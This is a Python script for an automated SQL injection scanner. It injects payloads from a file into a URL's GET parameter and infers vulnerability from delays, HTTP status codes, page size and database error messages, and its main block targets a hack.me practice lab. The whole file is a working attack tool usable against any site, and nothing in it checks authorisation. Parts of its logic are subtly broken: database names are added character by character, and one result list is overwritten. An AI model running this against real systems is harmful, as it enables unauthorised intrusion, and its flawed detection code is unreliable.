import requests
import re
import os
from tqdm import tqdm
from helpers.helpers import get_url_domain
from helpers.colors import bcolors

# https://hack.me/102132/delete-all-the-things.html

# possibly successful SQLi
heuristic_codes = [408, 500, 503, 504, 507, 509, 520, 521, 524]

# probably failed to SQLi
defense_codes = [203, 400, 401, 403, 405, 406,
                 409, 423, 429, 451, 499, 511, 525, 526]

heuristic_messages = [" SQL ", " database ", " db "]  # should use lower() on both strings when checking

# MySQL
mysql_pattern = r"(?i)error: 1[0-9]{3}"

# PostgreSQL
postgres_error_code = ['1000', '0100C', '1008', '1003', '1007', '1006', '1004',
                       '01P01', '2000', '2001', '3000', '8000', '8003', '8006',
                       '8001', '8004', '8007', '08P01', '9000', '0A000', '0B000',
                       '0F000', '0F001', '0L000', '0LP01', '0P000', '21000',
                       '22000', '2202E', '22021', '22008', '22012', '22005',
                       '2200B', '22022', '22015', '2201E', '2201F', '2201G',
                       '22018', '22007', '22019', '2200D', '22025', '22P06',
                       '22010', '22020', '22023', '2201B', '22009', '2200C',
                       '2200G', '22004', '22002', '22003', '22026', '22001',
                       '22011', '22027', '22024', '2200F', '22P01', '22P02',
                       '22P03', '22P04', '22P05', '23000', '23001', '23502',
                       '23503', '23505', '23514', '24000', '25000', '25001',
                       '25002', '25008', '25003', '25004', '25005', '25006',
                       '25007', '25P01', '25P02', '26000', '27000', '28000',
                       '2B000', '2BP01', '2D000', '2F000', '2F005', '2F002',
                       '2F003', '2F004', '34000', '38000', '38001', '38002',
                       '38003', '38004', '39000', '39001', '39004', '39P01',
                       '39P02', '3B000', '3B001', '3D000', '3F000', '40000',
                       '40002', '40001', '40003', '40P01', '42000', '42601',
                       '42501', '42846', '42803', '42830', '42602', '42622',
                       '42939', '42804', '42P18', '42809', '42703', '42883',
                       '42P01', '42P02', '42704', '42701', '42P03', '42P04',
                       '42723', '42P05', '42P06', '42P07', '42712', '42710',
                       '42702', '42725', '42P08', '42P09', '42P10', '42611',
                       '42P11', '42P12', '42P13', '42P14', '42P15', '42P16',
                       '42P17', '44000', '53000', '53100', '53200', '53300',
                       '54000','54001', '54011', '54023', '55000', '55006', 
                       '55P02', '55P03','57000', '57014', '57P01', '57P02', 
                       '57P03', '58030', '58P01', '58P02']

# Oracle
oracle_pattern = r"(?i)ORA-[0-9]{5}"

# MSSQL
mssql_messages = ["Microsoft"]


def most_common(lst):
    if lst:
        return max(set(lst), key=lst.count)
    else: 
        return None


def sql_inject(url_with_parameters):
    """
    Bruteforce inject payload into get parameters
    """

    domain = "http://" + get_url_domain(url_with_parameters)
    
    standart_size = True
    if len(requests.get(domain).content) <= 5120:
        standart_size = False

    injections = {"time": None, "code": None, "dbms": None, 
                       "size": None, "string": None
                       }

    with open(os.path.abspath(os.getcwd()) + "/assets/sqlpayload.txt", "r") as f:
        sql_payload = f.readlines()
    if "=" in url_with_parameters:
        param_spot = str(url_with_parameters).find('=')
        for inject in tqdm(sql_payload):

            if not inject[0] == "#":
                try:
                    inject = inject.split("\n")[0]  # injection snippet
                    sql_injected_url = str(url_with_parameters[0:param_spot + 1]) + str(inject)
                    response = requests.get(sql_injected_url)   # main resource check SQLi possibility
                    
                    ### HEURISTICS

                    # TIME BASED
                    response_time = response.elapsed.total_seconds() 
                    if response_time >= 6: # need to pick up best suited value
                        print(bcolors.FAIL + f"Possible time based SQLi, page load time: {response_time} seconds" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["time"] = inject

                    # ERROR BASED (HTTP CODES)
                    if response.status_code in heuristic_codes:
                        print(bcolors.FAIL + f"Possible error based SQLi, error code: {response.status_code}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["code"] = inject
                    elif response.status_code in defense_codes:
                        print(bcolors.CYAN + f"SQLi prevented, error code: {response.status_code}" + bcolors.OKGREEN)
                        print(bcolors.CYAN + f"SQLi payload: {inject}" + bcolors.OKGREEN)


                    # ERROR BASED (SPECIFIC DBMS STRINGS)
                    dbms = []
                    
                    html_text = response.text.lower()

                    mysql = re.findall(mysql_pattern, html_text)
                    mysql += re.findall(rf"([^.]*?mysql[^.]*\.)", html_text)

                    oracle = re.findall(oracle_pattern, html_text)
                    oracle += re.findall(rf"([^.]*?oracle[^.]*\.)", html_text)

                    postgres = []
                    for code in postgres_error_code:
                        if code.lower() in html_text:
                            postgres.append(code)
                    postgres += re.findall(rf"([^.]*?postgres[^.]*\.)", html_text)

                    sqlite = re.findall(rf"([^.]*?sqlite[^.]*\.)", html_text)
                    
                    mssql = []
                    for msg in mssql_messages:
                        mssql = re.findall(rf"([^.]*?{msg.lower()}[^.]*\.)", html_text)

                    if mysql:
                        print(bcolors.FAIL + f"Possible error based SQLi, DBMS: MySQL, error found: {str(mysql)}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["dbms"] = inject
                        dbms += "MySQL"
                    elif oracle:
                        print(bcolors.FAIL + f"Possible error based SQLi, DBMS: Oracle, error found: {str(oracle)}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["dbms"] = inject
                        dbms += "Oracle"
                    elif postgres:
                        print(bcolors.FAIL + f"Possible error based SQLi, DBMS: PostgreSQL, error found: {str(postgres)}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["dbms"] = inject
                        dbms += "PostgreSQL"
                    elif sqlite:
                        print(bcolors.FAIL + f"Possible error based SQLi, DBMS: SQLite, error found: {str(sqlite)}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["dbms"] = inject
                        dbms += "SQLite"
                    elif mssql:
                        print(bcolors.FAIL + f"Possible error based SQLi, DBMS: MSSQL, error found: {str(mssql)}" + bcolors.OKGREEN)
                        print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                        injections["dbms"] = inject
                        dbms += "MSSQL"
                    else:
                        for heuristic in heuristic_messages:
                            if heuristic.lower() in html_text:
                                print(bcolors.FAIL + f"Possible error based SQLi, DBMS: unknown, error found: {heuristic}" + bcolors.OKGREEN)
                                print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                                injections["string"] = inject

                    # ERROR BASED (PAGE SIZE)
                    if standart_size:
                        page_size = len(response.content) # bytes
                        if page_size <= 5120: # 5 KB
                            print(bcolors.FAIL + f"Possible error based SQLi, page_size: {page_size}" + bcolors.OKGREEN)
                            print(bcolors.FAIL + f"SQLi payload: {inject}" + bcolors.OKGREEN)
                            injections["size"] = inject
                    

                except KeyboardInterrupt:
                    print(bcolors.WARNING + "\nAborted by user...")
                    return None, []
        return injections, most_common(dbms)

    else:
        print(bcolors.OKGREEN + "GET SQLi is not possible")


if __name__ == "__main__":

    sql_inject("http://s108370-102132-efa.sipontum.hack.me/index.php?s=1&action=Search")

